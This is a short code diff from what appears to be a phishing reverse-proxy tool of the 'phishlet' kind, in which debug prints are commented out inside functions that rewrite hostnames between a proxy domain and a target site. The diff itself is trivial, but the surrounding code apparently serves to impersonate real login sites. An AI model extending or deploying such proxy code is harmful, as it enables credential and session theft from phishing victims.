@@ -76,16 +76,16 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     # for k in keys_to_delete:
     #     headers_dict.pop(k, None)
     # check if accept-encoding is in headers_dict if yes then print the headers_dict
-    if 'Accept-Encoding' in headers_dict:
-        print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
+    # if 'Accept-Encoding' in headers_dict:
+    #     print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
     # headers_dict['Accept-Encoding'] = 'identity'
 
     # If we have phishlet data and reverse filter is enabled, use proper hostname replacement
     if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
         # Build replacement mapping: proxy_hostname -> original_hostname
         hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
-        print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
-        print(f"\n ---- proxy_host parameter: {proxy_host}")
+        # print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
+        # print(f"\n ---- proxy_host parameter: {proxy_host}")
         
         # Extract base domain from proxy_host (e.g., 'test.xx.in' -> 'xx.in')
         base_domain = proxy_host
@@ -95,7 +95,7 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
             if len(parts) >= 2:
                 base_domain = '.'.join(parts[-2:])
         
-        print(f"\n ---- extracted base_domain: {base_domain}")
+        # print(f"\n ---- extracted base_domain: {base_domain}")
         
         replacement_map = {}
         
@@ -334,6 +334,7 @@ def replace_in_chunk_multi(chunk, target_to_proxy_map):
                 replaced = True
         return chunk
     return chunk
+
 
 
 def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_domain):
